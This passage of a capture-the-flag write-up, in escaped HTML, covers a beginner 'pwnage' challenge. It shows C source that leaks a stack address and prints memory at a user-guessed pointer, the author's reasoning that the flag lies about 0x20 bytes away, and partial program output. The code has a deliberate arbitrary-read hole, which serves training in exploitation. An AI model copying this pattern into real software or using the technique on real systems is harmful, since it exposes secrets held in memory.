class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"pwnage\">pwnage\u003C/h3>\n\u003Cblockquote>\n\u003Cp>It’s either a bug, a hack, an exploit, or it’s pwnage. Let this challenge stand as one of the first of many stairs to mastery over that which can only be described as pwn.\u003C/p>\n\u003C/blockquote>\n\u003Cp>Let’s look at the source code provided.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">int\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> main\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">    //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Hint: how do these values get stored?\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    void\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> first_var;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    char\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> guess;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> flag\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">100\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    load_flag\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(flag\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 100\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Welcome to the most tasmastic game of all time!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    wait_for\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">3\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Basically it's just too simple, I've put the\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">flag into the memory and your job is ... to\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">guess where it is!!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    wait_for\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">2\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Have fun!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    wait_for\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Oh and before you start, I'll give you a little\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">hint, the address of the current stackframe I'm\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">in is \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%p\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">&#x26;\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">first_var)[\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">-\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">2\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">])\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    wait_for\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">3\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Okay anyway, back to the game. Make your guess!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">(hexadecimals only, so something like 0xA would work)\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">guess> \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    guess \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> read_pointer\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    wait_for\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">3\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Okay, prepare yourself. If you're right this\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">will print out the flag\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    wait_for\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Oh, and if your wrong, this might crash and\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    puts\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">disconnect you\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Good luck!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%s\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> guess)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    return\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Ok, so it prints out the current stack frame of first_var. It then asks for a guess in hexadecimal format, which is a guess for the stack frame of the flag.\u003C/p>\n\u003Cp>We can look at this part specifically:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">void\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> first_var;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">char\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> guess;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> flag\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">100\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">load_flag\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(flag\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 100\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So all we need to do is “shift” upwards by adding bytes to the stackframe. Simple. I kind of guessed the offset, but it seems to be 0x20 from the provided stackframe.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Welcome\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> to\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> the\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> most\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> tasmastic\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> game\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> of\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> all\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> time!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\"> .\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> .\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> .\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Basically\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> it\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">s just too simple, I\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">ve\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> put\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> the\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">flag\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> into\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> the\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> memory\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> and\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> your\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> job\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> is\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> ...\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> to\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">guess\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> where\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> it\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> is!!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\"> .\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> .\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">How\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> fun\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> is\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> that!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\"> .\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Oh\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> and\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> before\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> you\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> start,\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> I\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">ll give you a little\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">hint, the address of the current stackframe I\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">m\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">in is 0x7ffeb79507b0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\"> .\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> .\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> .\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Okay\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> anyway,\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> back\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> to\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> the\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> game.\u003C/span>\u003Cspan 